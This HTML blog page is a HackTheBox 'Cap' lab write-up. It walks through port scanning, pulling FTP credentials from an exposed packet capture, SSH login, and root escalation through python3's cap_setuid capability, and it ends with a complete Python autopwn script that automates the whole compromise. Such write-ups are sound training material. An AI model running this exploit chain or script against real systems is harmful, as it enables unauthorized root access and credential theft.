@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Cap Writeup [HTB]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Cap Writeup [HTB] | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Cap Writeup [HTB]" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Cap is a Linux based machine that was active since June 5th of 2021 to October 2nd, on this machine we will find a packet capture file where we will find some credentials for the machine, connect with them through SSH, and find that python3 has setuid privilege, using it we will set us the uid of root (0), and spawn a shell finishing with the machine, since the machine is really short I will also leave a autopwn script at the end that automates everything." />
+<meta property="og:description" content="Cap is a Linux based machine that was active since June 5th of 2021 to October 2nd, on this machine we will find a packet capture file where we will find some credentials for the machine, connect with them through SSH, and find that python3 has setuid privilege, using it we will set us the uid of root (0), and spawn a shell finishing with the machine, since the machine is really short I will also leave a autopwn script at the end that automates everything." />
+<link rel="canonical" href="http://localhost:8000/Cap" />
+<meta property="og:url" content="http://localhost:8000/Cap" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/cap/cap.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-10-02T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/cap/cap.png" />
+<meta property="twitter:title" content="Cap Writeup [HTB]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2021-10-02T00:00:00-05:00","datePublished":"2021-10-02T00:00:00-05:00","description":"Cap is a Linux based machine that was active since June 5th of 2021 to October 2nd, on this machine we will find a packet capture file where we will find some credentials for the machine, connect with them through SSH, and find that python3 has setuid privilege, using it we will set us the uid of root (0), and spawn a shell finishing with the machine, since the machine is really short I will also leave a autopwn script at the end that automates everything.","headline":"Cap Writeup [HTB]","image":"http://localhost:8000/assets/images/cap/cap.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Cap"},"url":"http://localhost:8000/Cap"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/cap/cap.png/../banner.png>
+  
+  <h2>Cap Writeup [HTB]</h2>
+  <time datetime="2021-10-02T00:00:00-05:00" class="by-line">02 Oct 2021</time>
+  <p>Cap is a Linux based machine that was active since June 5th of 2021 to October 2nd, on this machine we will find a packet capture file where we will find some credentials for the machine, connect with them through SSH, and find that python3 has setuid privilege, using it we will set us the uid of root (0), and spawn a shell finishing with the machine, since the machine is really short I will also leave a autopwn script at the end that automates everything.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start using masscan to find all the available ports and then use nmap to get more information about them.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan <span class="nt">-e</span> tun0 <span class="nt">--rate</span><span class="o">=</span>500 <span class="nt">-p</span> 0-65535 10.10.10.245
+nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 22,80,21, <span class="nt">-Pn</span> <span class="nt">-o</span> scan.txt 10.10.10.245
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp open  http    gunicorn
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 404 NOT FOUND
+|     Server: gunicorn
+|     Date: Sat, 05 Jun 2021 19:05:18 GMT
+|     Connection: close
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+|     Content-Length: 232
+|     &lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//W3C//DTD HTML 3.2 Final//EN"</span><span class="o">&gt;</span>
+|     &lt;title&gt;404 Not Found&lt;/title&gt;
+|     &lt;h1&gt;Not Found&lt;/h1&gt;
+|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sat Jun  5 14:07:39 2021 -- 1 IP address (1 host up) scanned in 137.04 seconds</span>
+</code></pre></div></div>
+
+<p>We see three ports open, FTP, SSH and an HTTP server, so we start with the HTTP server.</p>
+
+<p><img src="/assets/images/cap/website.png" alt="" /></p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>We see a kind of security page, if we access to IP Config we will the output of <code class="language-plaintext highlighter-rouge">ifconfig</code>, if we enter to netstat we will se the output of <code class="language-plaintext highlighter-rouge">netstat</code>, but if we enter to security snapshot, which points to http://10.10.10.245/capture, we are redirected to another page.</p>
+
+<p><img src="/assets/images/cap/data.png" alt="" /></p>
+
+<p>We are redirected to data/3 on this case, on this page we can download a packet capture file about the last connections that were made to the machine, we can try to see any older one, also let’s remember that on programing the start is not 1, is 0, so we go to data/0, download 0.pcap and checking its contents we can see a commication with the FTP server, remember to always use encrypted channels.</p>
+
+<p><img src="/assets/images/cap/pcap.png" alt="" /></p>
+
+<p>We got some credentials for the FTP server, but they also work on SSH, so now we can get access to the machine and retrieve user.txt.</p>
+
+<p><img src="/assets/images/cap/shell.png" alt="" /></p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>Privilege Escalation</h1>
+
+<p>By the name of the machine I though that the privilige escalation path would be due to capabilities, so the first thing I did was look for any file with capabilities, to do so I ran, <code class="language-plaintext highlighter-rouge">getcap -r / 2&gt; /dev/null</code>.</p>
+
+<p><img src="/assets/images/cap/cappy.png" alt="" /></p>
+
+<p>We see that python3 has “cap_setuid”, set, if we go the <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">manual</a> we find what it means: <code class="language-plaintext highlighter-rouge">Make arbitrary manipulations of process UIDs</code>, so we can manipulate the UID of process, the easiest way to exploit this is import os module, and changing our UID and spawning a shell.</p>
+
+<p><img src="/assets/images/cap/root.png" alt="" /></p>
+
+<p>And with that we have finished with the machine, if you knew about linux capabilities this is one of the easiest machines on HTB, but if you don’t I can image this could take you a while to undertand.</p>
+
+<h1 id="autopwn"><a href="#header-1"></a>Autopwn</h1>
+
+<p>Since the machine was really easy I decided to write an autopwn script for the machine, this one gets the IP of the machine as argument, downloads the 0.pcap file, parses it with scapy, connects through SSH using pwntools and elevates the shell to root.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">signal</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">time</span>
+
+
+<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">fram</span><span class="p">):</span>
+    <span class="nf">print </span><span class="p">(</span><span class="sh">"</span><span class="s">Exiting...</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1">#Ctrl+C
+</span><span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="nf">print </span><span class="p">(</span><span class="sh">"</span><span class="s">Please provide the IP of the machine</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print </span><span class="p">(</span><span class="sh">"</span><span class="s">Usage example: python3 autopwn.py 10.10.10.245</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">log_mess</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
+    <span class="n">p1</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    
+<span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">"</span><span class="s">Pwning</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="nf">log_mess</span><span class="p">(</span><span class="sh">"</span><span class="s">Downloading pcap</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">pcap</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://</span><span class="sh">"</span> <span class="o">+</span> <span class="n">ip</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/download/0</span><span class="sh">"</span><span class="p">).</span><span class="n">content</span>
+<span class="n">save</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">0.pcap</span><span class="sh">"</span><span class="p">,</span><span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">save</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">pcap</span><span class="p">)</span>
+<span class="n">save</span><span class="p">.</span><span class="n">close</span>
+
+<span class="nf">log_mess</span><span class="p">(</span><span class="sh">"</span><span class="s">Parsing the pcap file</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">packets</span> <span class="o">=</span> <span class="nf">rdpcap</span><span class="p">(</span><span class="sh">"</span><span class="s">0.pcap</span><span class="sh">"</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">pkt</span> <span class="ow">in</span> <span class="n">packets</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">pkt</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">.</span><span class="n">dport</span> <span class="o">==</span> <span class="mi">21</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="n">Raw</span><span class="p">):</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">].</span><span class="n">load</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">payload</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">USER</span><span class="sh">"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+            <span class="nf">print </span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">User found!: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+            <span class="n">username</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">elif</span> <span class="n">payload</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">PASS</span><span class="sh">"</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="nf">print </span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Password found!: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+            <span class="n">password</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
+            <span class="k">break</span>
+            
+<span class="nf">log_mess</span><span class="p">(</span><span class="sh">"</span><span class="s">Connecting to SSH</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="nf">ssh</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">,</span><span class="n">host</span><span class="o">=</span><span class="n">ip</span><span class="p">).</span><span class="nf">shell</span><span class="p">()</span>
+<span class="n">shell</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+
+<span class="nf">log_mess</span><span class="p">(</span><span class="sh">"</span><span class="s">Getting user flag</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">shell</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">cat user.txt</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">User flag: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">shell</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
+
+<span class="nf">log_mess</span><span class="p">(</span><span class="sh">"</span><span class="s">Escalating privileges</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">shell</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">python3 -c </span><span class="se">\"</span><span class="s">import os;os.setuid(0);os.system(</span><span class="sh">'</span><span class="s">/bin/bash</span><span class="sh">'</span><span class="s">)</span><span class="se">\"\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">shell</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">shell</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">id</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">We are root: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">shell</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
+
+<span class="nf">log_mess</span><span class="p">(</span><span class="sh">"</span><span class="s">Getting root flag</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">shell</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">cat /root/root.txt</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">Root flag: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">shell</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
+
+<span class="n">p1</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">Machine owned!!</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">shell</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><img src="assets/images/cap/autopwn.gif" alt="" /></p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#linux-capabilities"> Linux capabilities</a> &nbsp;
+  
+  <a href="/tags.html#python"> Python</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
